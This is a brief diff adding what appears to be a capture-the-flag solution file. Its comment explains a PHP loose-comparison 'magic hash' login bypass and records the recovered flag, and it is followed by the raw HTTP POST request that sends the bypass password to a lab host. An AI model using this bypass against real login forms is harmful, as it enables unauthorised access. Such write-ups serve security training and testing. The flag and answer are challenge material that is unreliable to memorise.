@@ -1,0 +1,8 @@
+# PHP type juggling: MD5('240610708')=0e462097431906509019562988736854 == stored hash 0e678703625362188185747119782643 under PHP loose == comparison. Both treated as 0.0 in scientific notation. Extracts flag{b9d4ad78-52b8-4e0b-8e96-01653394513e}
+
+POST /index.php HTTP/1.1
+Host: 172.17.0.1:38977
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 18
+
+password=240610708
